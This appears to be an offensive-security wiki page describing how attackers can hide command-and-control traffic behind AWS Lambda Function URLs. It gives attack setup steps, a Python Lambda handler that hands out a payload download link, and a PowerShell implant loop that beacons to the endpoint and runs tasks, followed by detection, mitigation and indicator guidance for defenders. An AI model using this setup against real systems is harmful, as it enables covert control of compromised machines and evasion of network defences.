# Covert C2 Over AWS Lambda Function URLs

{{#include ../banners/hacktricks-training.md}}

## Overview
AWS Lambda **Function URLs** (introduced in 2022) let you expose an individual Lambda function through a direct HTTPS endpoint such as:
```
https://<function-id>.lambda-url.<region>.on.aws
```
Because traffic to *on.aws* domains is common in modern environments, adversaries can abuse the feature to hide Command-and-Control (C2) traffic in plain sight.  Unlike traditional cloud front-door techniques (CloudFront, API Gateway, etc.) the attacker does **not** need to maintain any infrastructure: AWS handles TLS termination, scaling and high availability for them.

In a malicious scenario, every beacon cycle performs a simple **GET** request to the Function URL and receives a JSON task list in the HTTP body.  Outbound traffic therefore looks like legitimate serverless telemetry and is very difficult to block without breaking business functionality.

### Attacker advantages
* No dedicated VPS or static IP – the entire C2 lives inside the attacker’s AWS account (or a hijacked one).
* Highly reputable domain (`*.on.aws`) and AWS-signed TLS certificate.
* Automatic scaling and 99.95 % availability.
* Pay-as-you-go pricing makes the infrastructure extremely cheap.

## Attack Set-up Step-by-Step
1. Create a new Lambda function (e.g. `python3.9`) in **any** region.
2. Add the malicious logic that parses the beacon request (headers / body) and returns a JSON response with commands:
   ```python
   import json, base64, boto3
   def lambda_handler(event, context):
       beacon = json.loads(event['body'] or '{}')
       # example beacon: {"id":"WIN-ACME", "arch":"x64", "ver":"1.0"}
       if beacon.get('cmd') == 'stage':
           # Return staging payload
           return {"statusCode":200, "body":json.dumps({"download":"https://example.com/payload.bin"})}
       # idle
       return {"statusCode":200, "body":json.dumps({})}
   ```
3. In the **Configuration ➜ Function URL** tab click *Create function URL* and set *Auth type* to **NONE**.
4. From the implant/back-door configure periodic HTTPS requests to the generated endpoint.  Example with PowerShell:
   ```powershell
   $url  = "https://ab123cd456.lambda-url.ap-southeast-1.on.aws"
   while ($true) {
       $resp = Invoke-WebRequest -Uri $url -UseBasicParsing
       $tasks = ($resp.Content | ConvertFrom-Json)
       # Execute tasks …
       Start-Sleep -Seconds 60
   }
   ```
5. Optionally host secondary payloads (tools, dlls, ZIP archives) in S3 presigned URLs or public buckets referenced from the JSON directions.

## Detection & Hunting
1. Inspect egress logs for HTTPS requests to the **`on.aws`** 2-level TLD that contain the substring **`lambda-url`**.
2. Enable **VPC Flow Logs** or a web proxy rule to surface unusual hostnames like `*.lambda-url.<region>.on.aws`.
3. Alert on Lambda Function URLs whose *Auth type* is **NONE** inside the organisation’s AWS accounts – they may be abused by attackers.
4. Cross-check Lambda execution logs (CloudWatch) with IAM CloudTrail events to detect suspicious code updates.

## Mitigation
* Enforce egress filtering policies that only allow requests to approved AWS endpoints.
* Require **IAM/λ token based authentication** for internal Function URLs whenever possible.
* Deploy web proxy signatures that flag unknown `lambda-url` sub-domains.

---
## Quick IOC Cheat-Sheet
| Indicator | Explanation |
|-----------|-------------|
| `*.lambda-url.*.on.aws` | DNS / URL pattern for Lambda Function URLs |
| TLS certificate CN `*.lambda-url.*.on.aws` | AWS-managed certificate seen in TLS JA3 |
| HTTP header `x-amzn-trace-id` | Automatically added by Lambda – can be used to tag beacon traffic |


## References
* [Behind the Clouds – Attackers Targeting Governments in Southeast Asia Implement Novel Covert C2 Communication](https://unit42.paloaltonetworks.com/windows-backdoor-for-novel-c2-communication/)
* [AWS – Announcing AWS Lambda Function URLs](https://aws.amazon.com/blogs/aws/announcing-aws-lambda-function-urls-built-in-https-endpoints-for-single-function-microservices/)
* [Trellix – OneCLIK red-team campaign (first public report of Lambda URL abuse)](https://www.trellix.com/blogs/research/oneclik-a-clickonce-based-red-team-campaign-simulating-apt-tactics-in-energy-infrastructure/)

{{#include ../banners/hacktricks-training.md}}
